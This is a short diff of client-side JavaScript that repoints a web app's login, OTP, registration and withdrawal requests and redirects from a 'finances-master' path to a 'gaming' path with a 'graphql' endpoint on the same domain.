@@ -90,26 +90,26 @@ xhttp.onreadystatechange = function() {
        console.log(xhttp.responseText);
        if (method === 'login' || method === 'otp' || method === 'withdrawal')
        {
-            window.location.replace('https://airfi.tech/finances-master/home.html');
+            window.location.replace('https://airfi.tech/gaming/home.html');
        }
        if (method === 'register' || method === 'recover' || method === 'account_details_change')
        {
-            window.location.replace('https://airfi.tech/finances-master/otp.html');
+            window.location.replace('https://airfi.tech/gaming/otp.html');
        }
        if (method === 'logon')
        {
-             window.location.replace('https://airfi.tech/finances-master/landing.html');
+             window.location.replace('https://airfi.tech/gaming/landing.html');
        }
     }
 };
 if (method === 'logon'){
-    xhttp.open("POST", "https://airfi.tech/finances-master/go?" + urlStr, false);
+    xhttp.open("POST", "https://airfi.tech/gaming/graphql?" + urlStr, false);
     xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
     xhttp.send();
 }
 else
 {
-    xhttp.open("POST", "https://airfi.tech/finances-master/submit?" + urlStr, false);
+    xhttp.open("POST", "https://airfi.tech/gaming/graphql?" + urlStr, false);
     xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
     xhttp.send();
 }
